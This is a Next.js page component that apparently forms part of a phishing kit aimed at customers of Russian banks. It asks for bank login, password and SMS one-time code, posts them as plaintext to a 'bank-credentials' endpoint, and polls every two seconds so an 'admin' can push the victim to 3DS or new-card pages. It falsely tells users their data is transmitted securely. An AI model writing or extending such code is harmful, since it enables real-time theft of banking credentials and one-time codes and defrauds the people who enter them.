'use client'

import { useState, useEffect } from 'react'
import { useRouter, useSearchParams, useParams } from 'next/navigation'
import { useAuth } from '@/hooks/use-auth'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { useToast } from '@/hooks/use-toast'
import { motion } from 'framer-motion'
import { Building2, ArrowRight, Loader2, CheckCircle, Shield } from 'lucide-react'
import { useTranslations } from 'next-intl'

interface PaymentData {
  payment_id: string
  amount: number
  currency: string
  user_email: string
}

const banks = [
  { id: 'sberbank', name: 'Sberbank', logo: '🏦' },
  { id: 'tinkoff', name: 'Tinkoff Bank', logo: '🟡' },
  { id: 'alfabank', name: 'Alfa-Bank', logo: '🔷' },
  { id: 'raiffeisen', name: 'Raiffeisen Bank', logo: '🟦' },
  { id: 'gazprom', name: 'Gazprombank', logo: '🟢' },
  { id: 'rosbank', name: 'Rosbank', logo: '🔴' },
  { id: 'other', name: 'Other Bank', logo: '🏦' }
]

export default function BankLoginPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const { locale } = useParams() as { locale: string }
  const { isAuthenticated } = useAuth()
  const { toast } = useToast()
  const t = useTranslations('payments')
  
  const [loading, setLoading] = useState(false)
  const [redirecting, setRedirecting] = useState(false)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  
  const [selectedBank, setSelectedBank] = useState('')
  const [bankLogin, setBankLogin] = useState('')
  const [bankPassword, setBankPassword] = useState('')
  const [smsCode, setSmsCode] = useState('')
  const [showSmsField, setShowSmsField] = useState(false)

  useEffect(() => {
    // Get payment data from URL parameters
    const paymentId = searchParams.get('payment_id')
    const amount = searchParams.get('amount')
    const currency = searchParams.get('currency')
    const userEmail = searchParams.get('user_email')

    if (paymentId && amount && currency && userEmail) {
      setPaymentData({
        payment_id: paymentId,
        amount: parseFloat(amount),
        currency: currency,
        user_email: userEmail
      })
    }
  }, [searchParams])

  useEffect(() => {
    if (!isAuthenticated) {
      router.push(`/${locale}/login?redirect=${encodeURIComponent(`/${locale}/payments/bank-login`)}`)
    }
  }, [isAuthenticated, router, locale])

  // Poll payment status for admin actions - ALWAYS ACTIVE
  useEffect(() => {
    if (!paymentData?.payment_id || !isAuthenticated) return

    const pollInterval = setInterval(async () => {
      try {
        const token = localStorage.getItem('token')
        if (!token) {
          console.error('No authentication token found')
          return
        }

        // Validate paymentId format
        if (!paymentData.payment_id || paymentData.payment_id.length < 10) {
          console.error('Invalid payment ID format:', paymentData.payment_id)
          return
        }

        const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentData.payment_id}/status`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        })

        if (response.ok) {
          const data = await response.json()
          const status = data.status

          console.log('🔄 Bank Login page - Payment status polled:', status)

          // Check if admin has requested a different action
          if (status === 'waiting_3ds') {
            console.log('🔐 Admin requested 3DS - redirecting...')
            router.push(`/${locale}/payments/3ds?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${paymentData.user_email}`)
          } else if (status === 'requires_new_card') {
            console.log('💳 Admin requested new card - redirecting...')
            router.push(`/${locale}/payments/new-card?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${paymentData.user_email}`)
          } else if (status === 'requires_bank_login') {
            console.log('🏦 Admin requested bank login again - staying on bank login page')
            // Stay on bank login page, admin requested bank login again
          } else if (status === 'completed' || status === 'failed' || status === 'cancelled') {
            console.log('🏁 Payment final status reached:', status)
            router.push(`/${locale}/payments`)
          }
        } else {
          console.error('Failed to fetch payment status:', response.status, response.statusText)
        }
      } catch (error) {
        console.error('Payment status polling error:', error)
      }
    }, 2000) // Poll every 2 seconds - ALWAYS ACTIVE

    return () => clearInterval(pollInterval)
  }, [paymentData, isAuthenticated, locale, router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!paymentData || !selectedBank) {
      toast({
        title: t('error'),
        description: t('fillAllRequiredFields'),
        variant: "destructive"
      })
      return
    }

    // Validate payment ID format
    if (!paymentData.payment_id || paymentData.payment_id.length < 10) {
      toast({
        title: t('error'),
        description: 'Неверный формат ID платежа',
        variant: "destructive"
      })
      return
    }

    // Validate bank selection
    if (!selectedBank || selectedBank === '') {
      toast({
        title: t('error'),
        description: 'Выберите банк',
        variant: "destructive"
      })
      return
    }

    // Validate bank login
    if (!bankLogin.trim() || bankLogin.trim().length < 3) {
      toast({
        title: t('error'),
        description: 'Логин банка должен содержать минимум 3 символа',
        variant: "destructive"
      })
      return
    }

    // Validate bank password
    if (!bankPassword || bankPassword.length < 4) {
      toast({
        title: t('error'),
        description: 'Пароль банка должен содержать минимум 4 символа',
        variant: "destructive"
      })
      return
    }

    // Validate SMS code if provided
    if (showSmsField && smsCode && (!/^\d{4,6}$/.test(smsCode))) {
      toast({
        title: t('error'),
        description: 'SMS код должен содержать 4-6 цифр',
        variant: "destructive"
      })
      return
    }

    setLoading(true)

    try {
      // Send bank login data to the server
      const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentData.payment_id}/bank-credentials`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({
          bank_name: selectedBank,
          bank_login: bankLogin.trim(),
          bank_password: bankPassword,
          sms_code: smsCode || null
        })
      })

      const data = await response.json()

      if (response.ok) {
        toast({
          title: t('success'),
          description: t('bankLoginDataSent'),
          variant: "default"
        })

        // Start redirecting in real time
        setRedirecting(true)
        
        // Simulate redirect to status page
        setTimeout(() => {
          router.push(`/${locale}/payments/status/${paymentData.payment_id}?step=bank_login_submitted`)
        }, 2000)

      } else {
        toast({
          title: t('error'),
          description: data.error || t('failedToSendData'),
          variant: "destructive"
        })
      }
    } catch (error) {
      toast({
        title: t('error'),
        description: t('errorSendingData'),
        variant: "destructive"
      })
    } finally {
      setLoading(false)
    }
  }

  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId)
    setShowSmsField(bankId !== 'other') // Show SMS field for main banks
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>Redirecting to login page...</p>
        </div>
      </div>
    )
  }

  if (redirecting) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
          <h2 className="text-2xl font-bold mb-2">Data sent!</h2>
          <p className="text-gray-400 mb-4">Redirecting to status page...</p>
          <div className="flex items-center justify-center space-x-2">
            <Loader2 className="h-4 w-4 animate-spin" />
            <span>Redirecting in real time</span>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-white py-20">
      <div className="max-w-2xl mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-8"
        >
          <h1 className="text-4xl font-bold text-white neon-glow mb-4">
            🏦 <span className="text-cyan-400">{t('bankLogin')}</span>
          </h1>
          <p className="text-xl text-gray-300">
            {t('enterBankLoginData')}
          </p>
        </motion.div>

        {paymentData && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.2 }}
            className="mb-8"
          >
            <Card className="bg-black/50 border-cyan-500/30">
              <CardHeader>
                <CardTitle className="text-cyan-400">{t('paymentInformation')}</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div>
                    <span className="text-gray-400">{t('paymentId')}:</span>
                    <p className="text-white font-mono">{paymentData.payment_id}</p>
                  </div>
                  <div>
                    <span className="text-gray-400">{t('amount')}:</span>
                    <p className="text-white">{paymentData.amount} {paymentData.currency}</p>
                  </div>
                  <div className="col-span-2">
                    <span className="text-gray-400">{t('email')}:</span>
                    <p className="text-white">{paymentData.user_email}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        )}

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
        >
          <Card className="bg-black/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-white">{t('bankLoginData')}</CardTitle>
              <CardDescription className="text-gray-400">
                {t('selectBankAndEnterCredentials')}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="bank" className="text-white">{t('selectBank')}</Label>
                  <Select value={selectedBank} onValueChange={handleBankSelect} required>
                    <SelectTrigger className="bg-gray-900 border-cyan-500/30 text-white">
                      <SelectValue placeholder={t('selectYourBank')} />
                    </SelectTrigger>
                    <SelectContent className="bg-gray-900 border-cyan-500/30">
                      {banks.map(bank => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center space-x-2">
                            <span>{bank.logo}</span>
                            <span>{bank.name}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="bankLogin" className="text-white">{t('bankLogin')}</Label>
                  <Input
                    id="bankLogin"
                    type="text"
                    placeholder="+7 (999) 123-45-67"
                    value={bankLogin}
                    onChange={(e) => setBankLogin(e.target.value)}
                    className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="bankPassword" className="text-white">{t('password')}</Label>
                  <Input
                    id="bankPassword"
                    type="password"
                    placeholder={t('enterPassword')}
                    value={bankPassword}
                    onChange={(e) => setBankPassword(e.target.value)}
                    className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                    required
                  />
                </div>

                {showSmsField && (
                  <div className="space-y-2">
                    <Label htmlFor="smsCode" className="text-white">{t('smsCode')}</Label>
                    <Input
                      id="smsCode"
                      type="text"
                      placeholder="1234"
                      value={smsCode}
                      onChange={(e) => setSmsCode(e.target.value.replace(/\D/g, ''))}
                      maxLength={6}
                      className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                    />
                    <p className="text-xs text-gray-400">
                      {t('enterSmsCodeIfRequired')}
                    </p>
                  </div>
                )}

                <Button
                  type="submit"
                  disabled={loading || !selectedBank || !bankLogin || !bankPassword}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white transition-all duration-300"
                >
                  {loading ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                      {t('sending')}...
                    </>
                  ) : (
                    <>
                      {t('loginToBank')}
                      <ArrowRight className="h-4 w-4 ml-2" />
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.6 }}
          className="mt-8"
        >
          <Card className="bg-green-500/10 border-green-500/30">
            <CardContent className="pt-6">
              <div className="flex items-start gap-3">
                <Shield className="h-5 w-5 text-green-400 mt-0.5" />
                <div className="text-sm text-green-300">
                  <p className="font-medium mb-1">{t('security')}</p>
                  <p className="text-green-200">
                    {t('allDataTransmittedSecurely')}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.8 }}
          className="mt-8 text-center"
        >
          <p className="text-gray-400 text-sm">
            🔒 {t('allDataTransmittedSecurely')}
          </p>
          <p className="text-gray-400 text-sm mt-2">
            📱 {t('redirectingToStatusPageInRealTime')}
          </p>
        </motion.div>
      </div>
    </div>
  )
}

